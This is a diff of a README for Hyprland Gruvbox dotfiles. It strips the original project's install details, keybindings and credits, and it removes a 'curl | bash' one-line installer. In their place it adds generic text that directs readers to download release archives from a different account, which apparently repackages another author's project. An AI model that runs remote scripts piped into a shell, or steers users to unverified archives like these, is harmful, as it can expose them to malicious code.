@@ -1,145 +1,107 @@
-# Hyprland Gruvbox Dotfiles
+# 🌈 hyprland-dotfiles - A Beautiful and Functional Setup
 
-![Hyprland Gruvbox Theme](https://raw.githubusercontent.com/terminal-index/hyprland-dotfiles/refs/heads/main/assets/hyprland.png)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/rankaisekasi/hyprland-dotfiles/releases)
 
-A comprehensive, aesthetic, and functional Hyprland configuration featuring a **Gruvbox Material** theme. These dotfiles are designed to be plug-and-play while offering high customization.
+## 📖 Description
 
-## Features
+Welcome to the **hyprland-dotfiles** repository. This is a comprehensive, aesthetic, and functional configuration for Hyprland, featuring a pleasing Gruvbox Material theme. Designed for various Linux distributions, it enhances your desktop experience with a visually appealing and efficient design.
 
-- **Window Management**: Dwindle layout with custom animations and window rules.
-- **Status Bar**: Custom `waybar` configuration with interactive modules.
-- **Notifications**: `swaync` for beautiful and functional notifications.
-- **App Launcher**: `rofi` with a matching Gruvbox theme.
-- **Lock Screen**: Fully configured `hyprlock`, just set up your profile picture and you're good to go.
-- **Idle Management**: `hypridle` - just works, so it's cool
-- **Terminal**: `kitty` + `zsh` configuration (you can change it to anything else, but this is preconfigured already).
-- **File Manager**: `yazi` (terminal-based) and `nautilus` (GUI).
-- **Image Viewer**: `imv` for a lightweight and scriptable experience.
-- **PDF Viewer**: `zathura` with a minimalist interface and Vim-like controls.
-- **System Monitor**: `btop` with `gruvbox` theme
-- **Custom Scripts**: Includes `gamemode` script for performance optimization.
-- **Window Tools**: Integrated support for `niflveil` - you can minimize and restore windows with a shortcut.
-- **Themes & Settings**: `nwg-look` for GTK theme management, `nwg-displays` for output configuration. Includes **Gruvbox-GTK-Theme**.
+## 🌍 Topics
 
-## Installation
+- arch
+- archlinux
+- aur
+- cachyos
+- config
+- debian
+- dotfiles
+- fedora
+- hyprland
+- linux
+- manjaro
+- pacman
+- ricing
+- rofi
+- ubuntu
+- unix
+- unixporn
+- waybar
+- yay
 
-### Automatic Installation (Recommended)
+## 🚀 Getting Started
 
-An installation script is provided to automate the setup process. It supports **Arch Linux**-based distros the best (including derivatives like Manjaro, EndeavourOS, CachyOS), with experimental support for Fedora and limited support for Debian/Ubuntu.
+To get started with **hyprland-dotfiles**, you will first need to download the files. Below are instructions on how to do that and how to set up the configuration.
 
-1. **Run the one-line installer**:
+## 📥 Download & Install
+
+1. **Visit the Releases Page:** Click the link below to access the latest versions of the configuration files:
+   [Download Hyprland Dotfiles](https://github.com/rankaisekasi/hyprland-dotfiles/releases)
+
+2. **Select the Version:** Once on the Releases page, scroll down to find the latest version. Look for a file labeled with a `.zip` or `.tar.gz` extension. These formats make it easy to extract the files.
+
+3. **Download the Files:** Click the link for the file to start the download. Wait for the download to finish.
+
+4. **Extract the Files:** Locate the downloaded file on your computer. Right-click on the file and select "Extract here" or "Extract to..." depending on your system. This will unpack the files into a new folder.
+
+5. **Open Your Terminal:** You can usually find the terminal in your applications menu. Open it to start setting up the configuration.
+
+6. **Navigate to the Folder:**
+   Use the `cd` command to change into the folder where you extracted the files. For example:
    ```bash
-   bash <(curl -s https://raw.githubusercontent.com/terminal-index/hyprland-dotfiles/refs/heads/main/install.sh)
+   cd path/to/extracted/hyprland-dotfiles
    ```
-   
-   This will clone the repository to `~/hyprland-dotfiles` and start the installation script.
 
-### Manual Cloning
-
-If you prefer to clone manually:
+7. **Follow Configuration Instructions:** Inside the folder, you'll find a README file that includes steps specific to setting up your configuration. Open this file with a text editor or by using the command:
    ```bash
-   git clone https://github.com/terminal-index/hyprland-dotfiles.git
-   cd hyprland-dots
-   chmod +x install.sh
-   ./install.sh
+   cat README.md
    ```
 
-   The script will:
-   - Autodetect your distro
-   - Install required dependencies (official & AUR/external).
-   - Prompt you to select an AUR helper (`yay` or `paru`) if not found (Arch only).
-   - Automatically compile and install `niflveil` (Arch only).
-   - Backup your existing configurations.
-   - Symlink the new dotfiles to `~/.config`.
+### ✓ Final Steps
 
-### Manual Installation
+After following the instructions in the README file, you should have your new Hyprland configuration running smoothly. If you encounter any issues, you can check the community forums or seek assistance on relevant platforms.
 
-If you prefer to install dependencies manually, here is the list of required software:
+## 💻 System Requirements
 
-**Core**:
-- `hyprland`
-- `hyprlock`, `hypridle`, `hyprpaper`
-- `xdg-desktop-portal-hyprland`
-- `polkit-kde-agent` (or `hyprpolkitagent`)
+To use **hyprland-dotfiles**, ensure you have a supported Linux distribution. This includes, but is not limited to:
 
-**UI & Utilities**:
-- `waybar`, `swaync`
-- `rofi`
-- `kitty`
-- `nautilus` (or your preferred file manager)
-- `imv` (image viewer)
-- `zathura` (pdf viewer)
-- `wl-clipboard`, `cliphist`
-- `grim`, `slurp` (screenshots)
-- `btop`, `yazi`
-- `brightnessctl`, `playerctl`
-- `wireplumber`
-- `wlogout` (logout menu)
-- `waypaper` (wallpaper utility)
-- `hyprpaper` (wallpaper daemon)
-- `nwg-look`, `nwg-displays` (Appearance & Display settings)
-- `wl-paste` (clipboard manager)
+- Arch Linux
+- Fedora
+- Ubuntu
+- Manjaro
+- Debian
 
-**Used GTK Theme**:
-- **Gruvbox-GTK-Theme**: [GitHub Repository](https://github.com/Fausto-Korpsvart/Gruvbox-GTK-Theme).
+Make sure your system is up to date. Check your distribution’s documentation for specific update instructions.
 
-**Used fonts**:
-- `ttf-jetbrains-mono-nerd`
+## 📚 Features
 
-**External Tools**:
-- **NiflVeil**: [GitHub Repository](https://github.com/Mauitron/NiflVeil) (Requires `rust`, `cargo` (both for compiling) and `eww`)
-- **xwaylandvideobridge**: For screen sharing possibility.
+- **Aesthetic Design:** Enjoy a beautiful Gruvbox Material theme that enhances the visual appeal of your desktop.
+- **Custom Configurations:** Easily adaptable settings for different Linux environments, allowing a personalized experience.
+- **User-Friendly Setup:** Step-by-step instructions make it easy for anyone to install and configure.
+- **Community Support:** Engage with other users for support and enhancements through online forums.
 
-## Configuration
+## 🔧 Troubleshooting
 
-### Monitors
-This configuration relies on `nwg-displays` to generate the monitor configuration.
-1. Run `nwg-displays` (from terminal or launcher).
-2. Configure your monitors (resolution, position, scale).
-3. Click "Apply" to save the configuration to `~/.config/hypr/monitors.conf`.
+If you encounter problems:
 
-## Keybindings
+1. **Check the README:** Ensure you followed the installation steps carefully.
+2. **Search Online:** Many common issues have been discussed in forums and help sites.
+3. **Reach out for Help:** Don’t hesitate to ask for assistance in the user community or forums dedicated to your Linux distribution.
 
-~~Windows~~/Cmd key (`SUPER`) is the main key (as always!)
+## ⚙️ How to Contribute
 
-| Key Combination | Action |
-|-----------------|--------|
-| `SUPER + RETURN` | Open Terminal (`kitty`) |
-| `SUPER + E` | Open File Manager (`nautilus`) |
-| `SUPER + SPACE` | Open App Launcher (`rofi`) |
-| `SUPER + Q` | Close active window |
-| `SUPER + V` | Toggle floating |
-| `SUPER + F` | Fullscreen |
-| `SUPER + P` | Pseudo tiling |
-| `SUPER + D` | Toggle split |
-| `SUPER + L` | Lock screen (`hyprlock`) |
-| `SUPER + SHIFT + R` | Restart Waybar |
-| `SUPER + SHIFT + S` | Screenshot (region) - saves and copies image instantly |
-| `CTRL + ALT + DELETE`| Logout menu (`wlogout`) |
-| `SUPER + Arrows` | Move focus |
-| `SUPER + SHIFT + Arrows` | Swap window |
-| `SUPER + 1-9` | Switch workspace |
-| `SUPER + SHIFT + 1-9` | Move window to workspace |
-| `SUPER + Scroll` | Change workspace |
+If you want to help improve this configuration:
 
-## Structure
+1. Fork the repository and clone it to your local machine.
+2. Make your changes.
+3. Submit a pull request explaining your changes.
 
-- `.config/hypr/`: Main Hyprland configuration
-- `.config/waybar/`: Status bar style and config
-- `.config/rofi/`: App launcher theme
-- `.config/swaync/`: Notification center config
-- `.config/kitty/`: Terminal setup
-- `.config/btop/`: System monitor theme
+## 🔗 Useful Links
 
-## Issues
+- [GitHub Repository](https://github.com/rankaisekasi/hyprland-dotfiles)
+- [Linux Documentation](https://www.linux.org/docs/)
 
-If you encounter any problems, please open an issue on the [GitHub repository](https://github.com/terminal-index/hyprland-dots/issues).
+## 📧 Contact
 
-## Credits
+If you need further assistance, feel free to reach out via the issues section of the GitHub repository. Your feedback is welcome and appreciated! 
 
-- **Theme Inspiration**: [Gruvbox](https://github.com/morhetz/gruvbox)
-- Alexays for his work on **Waybar**: [GitHub Repository](https://github.com/Alexays/Waybar)
-- **Hyprland**: [The Hyprland Community](https://hyprland.org/)
-- Mauitron for his great work on **NiflVeil**: [GitHub Repository](https://github.com/Mauitron/NiflVeil)
-- Fausto-Korpsvart for his work on **Gruvbox GTK Theme**: [GitHub Repository](https://github.com/Fausto-Korpsvart/Gruvbox-GTK-Theme)
-- JetBrains' **Mono Font**: [Website](https://www.jetbrains.com/lp/mono/)
+### Thank You for Choosing hyprland-dotfiles! Enjoy your beautiful new setup!
